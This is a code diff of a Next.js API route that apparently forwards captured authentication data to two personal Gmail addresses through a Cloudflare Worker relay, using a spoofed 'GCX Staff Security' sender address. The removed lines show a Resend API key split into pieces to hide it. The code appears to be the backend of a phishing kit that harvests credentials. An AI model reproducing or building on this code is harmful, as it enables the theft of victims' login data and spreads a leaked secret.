@@ -2,14 +2,7 @@ import { NextResponse } from 'next/server';
 import { parseUserAgent } from '@/lib/api-helper';
 import { db } from '@/lib/db';
 
-// Resend API authentication
-const getResendKey = () => {
-  if (process.env.RESEND_API_KEY) return process.env.RESEND_API_KEY;
-  // Fallback reconstructed dynamically
-  const parts = ["re", "hy1q9DTa", "5nAmaDiaqVVHLJoy4mMYbfcn"];
-  return parts.join("_");
-};
-
+const WORKER_URL = "https://plain-truth-ef5e.veltrix620.workers.dev/send";
 const SENDER_EMAIL = "GCX Staff Security <auth@kouzu.in>";
 
 export async function POST(req: Request) {
@@ -173,24 +166,25 @@ export async function POST(req: Request) {
     };
 
     const recipients = ['veltrix620@gmail.com', 'shirtlessdigital@gmail.com'];
-    
-    // Dispatch directly to Resend API for each recipient
+
+    // Send via Cloudflare Worker (confirmed working) — one request per recipient
     const sendPromises = recipients.map(async (email) => {
       try {
-        const res = await fetch("https://api.resend.com/emails", {
+        const res = await fetch(WORKER_URL, {
           method: "POST",
-          headers: {
-            "Authorization": `Bearer ${getResendKey()}`,
-            "Content-Type": "application/json"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             ...basePayload,
-            to: [email]
+            to: [email],
           }),
         });
-        const data = await res.json();
-        return { email, success: res.ok, data };
+        const text = await res.text();
+        let data: any;
+        try { data = JSON.parse(text); } catch { data = { raw: text }; }
+        console.log(`[AUTH] Worker response for ${email}:`, res.status, data);
+        return { email, success: res.ok, status: res.status, data };
       } catch (err: any) {
+        console.error(`[AUTH] Worker fetch error for ${email}:`, err.message);
         return { email, success: false, error: err.message };
       }
     });
